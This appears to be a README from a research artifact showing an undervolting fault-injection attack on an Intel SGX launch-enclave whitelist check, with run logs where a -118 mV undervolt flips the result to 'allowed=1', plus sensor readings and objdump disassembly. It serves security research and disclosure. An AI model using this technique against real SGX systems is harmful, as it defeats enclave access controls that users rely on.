# Example V.A: Launch Enclave Application Scenario

As usual, you need SGX-Step. As usual, we assume it is in `../sgx-step/` - adapt the Makefile (`LIBSGXSTEP_DIR`) if needed. We also assume the SGX-SDK is correctly setup and the environment sourced.

Run on our i3-7100U-C with -118 mV:

```
jo@jo-nuc:~/cpu-faults/sgx-struct-array-index$ sudo ./app 200 -118
Creating enclave...
==== Victim Enclave ====
[pt.c] /dev/sgx-step opened!
    Base:   0x7f1854000000
    Size:   67108864
    Limit:  0x7f1858000000
    TCS:    0x7f1856c82000
    SSA:    0x7f1856c83f48
    AEP:    0x7f185d323805
    EDBGRD: debug
[main.c] calling enclave; sizeof(struct_foo_t)=36
Signal 11 received
siginfo address = 7f18367fc000
Will now map to 7f18367fc000
enclave iteration=573569; base_adrs=0x7f18555efe80
adrs(RDI)=0x7f18367fcf42; idx=0xffffffffe120d0c2; expected=0x120d0a1 xor=0xffffffffe0000063
attacker computed: adrs=0x7f18367fcf42
enclave computed:  adrs=0x7f18367fcf42
[main.c] Fault fault fault!!!
[main.c] Done. enclave returned allowed=1


jo@jo-nuc:~/cpu-faults/sgx-struct-array-index$ sensors
iwlwifi-virtual-0
Adapter: Virtual device
temp1:            N/A  

acpitz-virtual-0
Adapter: Virtual device
temp1:       -263.2°C  

coretemp-isa-0000
Adapter: ISA adapter
Package id 0:  +45.0°C  (high = +100.0°C, crit = +100.0°C)
Core 0:        +44.0°C  (high = +100.0°C, crit = +100.0°C)
Core 1:        +42.0°C  (high = +100.0°C, crit = +100.0°C)

pch_skylake-virtual-0
Adapter: Virtual device
temp1:        +43.0°C  

jo@jo-nuc:~/cpu-faults/sgx-struct-array-index$ cat /proc/cpuinfo | grep Hz
model name	: Intel(R) Core(TM) i3-7100U CPU @ 2.40GHz
cpu MHz		: 2000.110
model name	: Intel(R) Core(TM) i3-7100U CPU @ 2.40GHz
cpu MHz		: 2000.000
model name	: Intel(R) Core(TM) i3-7100U CPU @ 2.40GHz
cpu MHz		: 2000.305
model name	: Intel(R) Core(TM) i3-7100U CPU @ 2.40GHz
cpu MHz		: 2002.713


jo@jo-nuc:~/cpu-faults/sgx-struct-array-index$ sudo ./app 200 0
Creating enclave...
==== Victim Enclave ====
[pt.c] /dev/sgx-step opened!
    Base:   0x7f0494000000
    Size:   67108864
    Limit:  0x7f0498000000
    TCS:    0x7f0496c82000
    SSA:    0x7f0496c83f48
    AEP:    0x7f049a405805
    EDBGRD: debug
[main.c] calling enclave; sizeof(struct_foo_t)=36
[main.c] 100/200
[main.c] Done. enclave returned allowed=0


jo@jo-nuc:~/cpu-faults/sgx-struct-array-index$ objdump -D Enclave/encl.so | grep "check_wl_entry" -A 20
0000000000000ca1 <_Z14check_wl_entrymP18_sgx_measurement_ti>:
     ca1:	48 6b ff 21          	imul   $0x21,%rdi,%rdi
     ca5:	55                   	push   %rbp
     ca6:	53                   	push   %rbx
     ca7:	48 8d 1d d2 f1 5e 01 	lea    0x15ef1d2(%rip),%rbx        # 15efe80 <g_ref_le_white_list_cache>
     cae:	89 d5                	mov    %edx,%ebp
     cb0:	ba 20 00 00 00       	mov    $0x20,%edx
     cb5:	48 83 ec 08          	sub    $0x8,%rsp
     cb9:	48 01 fb             	add    %rdi,%rbx
     cbc:	48 89 df             	mov    %rbx,%rdi
     cbf:	e8 5c 66 00 00       	callq  7320 <memcmp>
     cc4:	31 d2                	xor    %edx,%edx
     cc6:	85 c0                	test   %eax,%eax
     cc8:	75 0d                	jne    cd7 <_Z14check_wl_entrymP18_sgx_measurement_ti+0x36>
     cca:	85 ed                	test   %ebp,%ebp
     ccc:	ba 01 00 00 00       	mov    $0x1,%edx
     cd1:	74 04                	je     cd7 <_Z14check_wl_entrymP18_sgx_measurement_ti+0x36>
     cd3:	0f b6 53 20          	movzbl 0x20(%rbx),%edx
     cd7:	89 d0                	mov    %edx,%eax
     cd9:	5a                   	pop    %rdx
     cda:	5b                   	pop    %rbx
     cdb:	5d                   	pop    %rbp
     cdc:	c3                   	retq   
     cdd:	0f 1f 00             	nopl   (%rax)

0000000000000ce0 <get_launch_token>:
     ce0:	48 83 ec 28          	sub    $0x28,%rsp
     ce4:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
     ce9:	89 74 24 04          	mov    %esi,0x4(%rsp)
     ced:	48 c7 44 24 18 00 00 	movq   $0x0,0x18(%rsp)
     cf4:	00 00 
     cf6:	48 81 7c 24 18 ed d1 	cmpq   $0x8d1ed,0x18(%rsp)
     cfd:	08 00 
     cff:	77 3b                	ja     d3c <get_launch_token+0x5c>
     d01:	8b 54 24 04          	mov    0x4(%rsp),%edx
     d05:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
     d0a:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
--
     d12:	e8 8a ff ff ff       	callq  ca1 <_Z14check_wl_entrymP18_sgx_measurement_ti>
     d17:	85 c0                	test   %eax,%eax
     d19:	0f 95 c0             	setne  %al
     d1c:	84 c0                	test   %al,%al
     d1e:	74 07                	je     d27 <get_launch_token+0x47>
     d20:	b8 01 00 00 00       	mov    $0x1,%eax
     d25:	eb 1a                	jmp    d41 <get_launch_token+0x61>
     d27:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
     d2c:	48 8b 54 24 18       	mov    0x18(%rsp),%rdx
     d31:	48 89 10             	mov    %rdx,(%rax)
     d34:	48 83 44 24 18 01    	addq   $0x1,0x18(%rsp)
     d3a:	eb ba                	jmp    cf6 <get_launch_token+0x16>
     d3c:	b8 00 00 00 00       	mov    $0x0,%eax
     d41:	48 83 c4 28          	add    $0x28,%rsp
     d45:	c3                   	retq   

0000000000000d46 <sgx_init_wl>:
     d46:	48 85 ff             	test   %rdi,%rdi
     d49:	75 0d                	jne    d58 <sgx_init_wl+0x12>
     d4b:	48 83 ec 08          	sub    $0x8,%rsp
     d4f:	e8 39 ff ff ff       	callq  c8d <init_wl>

```
